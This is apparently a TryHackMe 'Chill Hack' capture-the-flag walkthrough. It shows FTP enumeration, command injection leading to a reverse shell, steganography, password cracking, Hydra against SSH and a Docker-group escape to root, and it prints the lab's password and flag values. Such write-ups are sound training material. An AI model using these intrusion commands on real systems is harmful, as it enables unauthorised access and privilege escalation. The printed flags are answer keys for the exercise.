# TryHackMe - Chill Hack

> **Focus:** FTP enumeration, web directory discovery, command injection, steganography, password cracking, SSH access, and Docker privilege escalation.

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-55a630?style=flat-square&labelColor=555555)
![Focus](https://img.shields.io/badge/Focus-FTP%20Enumeration%20%7C%20Command%20Injection%20%7C%20Docker%20Privilege%20Escalation-blue)
![Target](https://img.shields.io/badge/Target-Linux-orange)

---

## 10. Attack Path Summary

```text
Nmap
  |
  v
FTP anonymous login
  |
  v
Download note.txt
  |
  v
Gobuster discovers /secret/
  |
  v
Command execution in /secret/
  |
  v
Reverse shell as www-data
  |
  v
Inspect web files and image references
  |
  v
StegSeek extracts backup.zip
  |
  v
zip2john + John crack archive password
  |
  v
Decode password from source_code.php
  |
  v
Hydra identifies SSH credentials for anurodh
  |
  v
SSH login; discover Docker group membership
  |
  v
Abuse Docker access to obtain root
  |
  v
Read local.txt and proof.txt
```

---

## 1. Reconnaissance

Start with a basic Nmap scan to identify the exposed services.

```bash
nmap <TARGET_IP>
```

The scan in the screenshots identified these open ports:

| Port | Service |
|---|---|
| 21/tcp | FTP |
| 22/tcp | SSH |
| 80/tcp | HTTP |

<img width="587" height="207" alt="1" src="https://github.com/user-attachments/assets/30e0c77e-8ea6-4a74-8602-37847fd5178f" />

The FTP service banner identified **vsftpd 3.0.5**. The next step was to check whether anonymous FTP access was enabled.

## 2. Anonymous FTP Enumeration

Connect to the FTP service and try the `anonymous` account.

```bash
ftp -A <TARGET_IP>
```

At the username prompt, enter:

```text
anonymous
```

The login succeeded. Listing the FTP directory revealed `note.txt`, which was downloaded for inspection.

```text
ls
get note.txt
```

<img width="368" height="191" alt="2" src="https://github.com/user-attachments/assets/4583f8bd-1f70-4794-8309-c51a0930bcb8" />

<img width="561" height="213" alt="3" src="https://github.com/user-attachments/assets/0c73e791-7808-4dbd-9018-5555c8b05500" />

The note contained a hint from Apaar: Anurodh had mentioned filtering of strings passed into a command. This suggested that a command-execution feature might be present on the website.

<img width="734" height="107" alt="4" src="https://github.com/user-attachments/assets/94e36185-4efc-4d44-b00d-e87e7a7c238d" />

## 3. Web Enumeration

Open the target in a browser and inspect the website.

```text
http://<TARGET_IP>/
```

<img width="1296" height="433" alt="5" src="https://github.com/user-attachments/assets/282692ae-3f6d-4ea8-a300-d8712b06c76b" />

Run Gobuster to discover hidden directories and files.

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/dirb/wordlists/common.txt
```

The scan found a `/secret/` directory, along with common web directories such as `/css/`, `/fonts/`, `/images/`, and `/js/`.

<img width="739" height="483" alt="6" src="https://github.com/user-attachments/assets/fdaced43-4369-4087-b6d2-17b26e892869" />

Browse to the discovered directory:

```text
http://<TARGET_IP>/secret/
```

The page exposed a command input field with an **Execute** button.

<img width="830" height="157" alt="7" src="https://github.com/user-attachments/assets/16467fb3-1c4a-4fea-951f-6662fcc93ce0" />

Testing a harmless command such as `id` showed that commands were being executed as the web-server account, `www-data`.

```bash
id
```

<img width="833" height="129" alt="8" src="https://github.com/user-attachments/assets/780a1b77-2788-4c54-9680-e08eac04da02" />

The page displayed a themed response when another command was entered, but the important finding was that the input was reaching a command-execution path.

<img width="521" height="147" alt="9" src="https://github.com/user-attachments/assets/207ad596-697c-4198-b4c4-b14227d2fcc5" />

### Further command execution tests

The next screenshots show additional tests using absolute paths to system binaries. Listing the current directory revealed `images` and `index.php`:

```bash
/bin/ls
```

<img width="280" height="109" alt="10" src="https://github.com/user-attachments/assets/e34af208-8b0f-4af5-8296-687f3c94a335" />

The input was also used to read `/etc/passwd`:

```bash
/bin/cat /etc/passwd
```

<img width="1232" height="278" alt="11" src="https://github.com/user-attachments/assets/719bfc41-fd1d-47d9-9d4d-cd795f61b858" />

Reviewing the output revealed local account entries, including `apaar` and `anurodh`. These usernames became useful candidates during later SSH enumeration.

<img width="431" height="81" alt="12" src="https://github.com/user-attachments/assets/f53130a6-6adc-42c7-8bd5-b6d752808da1" />

These tests confirmed that the web input could execute system commands and read local files. The FTP note's warning about filtering command input was therefore an important clue during exploitation.

## 4. Command Injection and Initial Access

The FTP note mentioned filtering of strings passed into a command. This was a useful clue when testing the `/secret/` input.

The screenshots show the use of PHP command execution to establish a reverse connection. Start a listener on the attacking machine:

```bash
nc -lvnp 4444
```

Then submit a PHP reverse-shell command through the vulnerable command field, adjusting the callback IP and port to match your attacking machine.

<img width="354" height="93" alt="13-1" src="https://github.com/user-attachments/assets/eca8cb13-7f49-460a-aa7e-3c2c6f6ea05a" />

<img width="384" height="97" alt="13-2" src="https://github.com/user-attachments/assets/490113b8-73cf-48c0-afcd-0bee1694032e" />

A connection was received. Running `id` in the shell confirmed the initial foothold was the `www-data` account.

<img width="536" height="131" alt="13-3" src="https://github.com/user-attachments/assets/99ddb52a-2593-46aa-ab51-a34fd7d62c9c" />

## 5. Steganography and Backup Archive

After obtaining the shell, inspect the web application files.

```bash
cd /var/www
ls
cd files
ls -la
```

<img width="447" height="250" alt="14" src="https://github.com/user-attachments/assets/c037cd7e-aefb-4046-93be-e3d807dd2346" />

Inspect the application source. The screenshots show the login page source and the `hacker.php` page. The latter contains a hint: **“Look in the dark! You will find your answer.”**

```bash
cat index.php
cat hacker.php
```

<img width="1003" height="462" alt="15" src="https://github.com/user-attachments/assets/44949a7f-b6e0-4a7d-9955-0c66adf50aea" />

<img width="762" height="431" alt="16" src="https://github.com/user-attachments/assets/e2e6a217-4e3a-48d1-8642-49273bc80350" />

The `hacker.php` page references image files in the `images` directory. Enumerate those files.

```bash
cd images
ls -la
```

<img width="707" height="155" alt="17" src="https://github.com/user-attachments/assets/e8db5998-20f2-4e8b-ad06-a545b2ee31f3" />

To analyze the image files from the attacking machine, serve the directory over HTTP from the compromised host:

```bash
python3 -m http.server 8888
```

<img width="624" height="26" alt="18" src="https://github.com/user-attachments/assets/ebc0cf20-91bc-4a05-80e4-ebf6c803dc43" />

Download the referenced images to the attacking machine:

```bash
wget http://<TARGET_IP>:8888/002d7e638fb463fb7a266f5ff7ac47d.gif
wget http://<TARGET_IP>:8888/hacker-with-laptop_23-2147985341.jpg
```

The filenames above should be checked against the exact names shown by `ls` in your own session.

<img width="774" height="400" alt="19" src="https://github.com/user-attachments/assets/a8a13291-edf4-41c6-a1fb-7f06bd6494a7" />

Run StegSeek against the JPEG image to check for embedded data.

```bash
stegseek hacker-with-laptop_23-2147985341.jpg
```

StegSeek identified an embedded file named `backup.zip`.

<img width="515" height="131" alt="20" src="https://github.com/user-attachments/assets/58b1fc82-0807-4600-b096-1e7f3be9b656" />

Attempt to extract the archive. It is password protected.

```bash
unzip backup.zip
```

<img width="511" height="129" alt="21" src="https://github.com/user-attachments/assets/98c7266d-8dc3-4427-9f19-ca4c294479fc" />

## 6. Recovering SSH Credentials

Use `zip2john` to extract the archive's password hash, then crack it with John the Ripper.

```bash
zip2john backup.zip > backup.hash
john backup.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

<img width="1277" height="252" alt="22" src="https://github.com/user-attachments/assets/2ad6a617-4736-4a05-8268-88705905d229" />

<img width="782" height="171" alt="23" src="https://github.com/user-attachments/assets/57f3ece9-2e32-4683-9c84-95394288d189" />

After cracking the archive password, extract the source file.

```bash
unzip backup.zip
```

Inspect `source_code.php`. The code contains a Base64-encoded password value used in its authentication logic.

<img width="886" height="671" alt="24" src="https://github.com/user-attachments/assets/cfaa5ed9-9a1f-4acd-82ea-97804e4715d2" />

Decode the Base64 string:

```bash
echo 'IWQwbnRLbjB3bVlQHNzdzByZA==' | base64 -d
```

The decoded password shown in the screenshots is:

```text
!dontKnowmYpassword
```

<img width="423" height="57" alt="25" src="https://github.com/user-attachments/assets/d61e6a97-6e3e-4501-8483-8e838d6fc0cc" />

## 7. User Access and Local Enumeration

The screenshots show a small username list containing the candidate accounts `aurick`, `apaar`, and `anurodh`. Use Hydra to test the recovered password against SSH for those candidates.

```bash
hydra -L users.txt -p '!dontKnowmYpassword' ssh://<TARGET_IP> -vV
```

Hydra identified valid SSH credentials:

```text
Username: anurodh
Password: !dontKnowmYpassword
```

<img width="817" height="317" alt="26" src="https://github.com/user-attachments/assets/ce46ee1c-f445-4b13-9329-02bd2a55fabd" />

Connect over SSH:

```bash
ssh anurodh@<TARGET_IP>
```

Once logged in, check the account's group memberships.

```bash
id
```

The account belongs to the `docker` group, which is a significant privilege-escalation lead.

<img width="647" height="54" alt="27" src="https://github.com/user-attachments/assets/c2d76017-91ba-4846-af4e-1bcf0726cfaf" />

Inspect the available home directories and the `apaar` account's files.

```bash
ls /home
cd /home/apaar
ls -la
```

<img width="507" height="289" alt="28" src="https://github.com/user-attachments/assets/997481d7-a01d-4611-b4eb-41f4f23bf701" />

The `.helpline.sh` script accepts user input and then executes the supplied message variable. This is an unsafe use of shell input.

```bash
cat .helpline.sh
```

<img width="592" height="226" alt="29" src="https://github.com/user-attachments/assets/2a0058f0-ad83-4ab3-b35f-caec53378609" />

The script can be run to observe its prompts.

```bash
./.helpline.sh
```

<img width="508" height="124" alt="30" src="https://github.com/user-attachments/assets/502dec91-84b1-4ef1-a0d2-6113826ecd35" />

The Docker group membership is the direct route to root in this walkthrough, so continue with Docker privilege escalation.

## 8. Docker Privilege Escalation

Because the `anurodh` account belongs to the `docker` group, it can start a container with the host filesystem mounted inside it. The screenshots demonstrate using an Alpine container and `chroot` to obtain a root shell in the mounted host filesystem.

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

Verify the effective identity:

```bash
id
```

The resulting shell reports UID 0 (root).

<img width="983" height="94" alt="31" src="https://github.com/user-attachments/assets/b4a8a886-19d4-486d-aed6-d2da9ffe4d4c" />

## 9. Flags

### User flag

From the root shell, read the user flag file under `/home/apaar`.

```bash
cd /home/apaar
cat local.txt
```

```text
e8vpd3323cfvlpOqpxxx9qtr5iq37oun
```


<img width="439" height="123" alt="32" src="https://github.com/user-attachments/assets/b5d613fa-f98e-4447-88d8-c280cf2adcc3" />

### Root flag

Read the proof file from `/root`.

```bash
cd /root
cat proof.txt
```

```text
w18gfpn9xehsgd3tovhkohby4gdps9bg
```

<img width="721" height="133" alt="33" src="https://github.com/user-attachments/assets/34d6020d-a0a6-4ec3-866e-7bf146e480f7" />

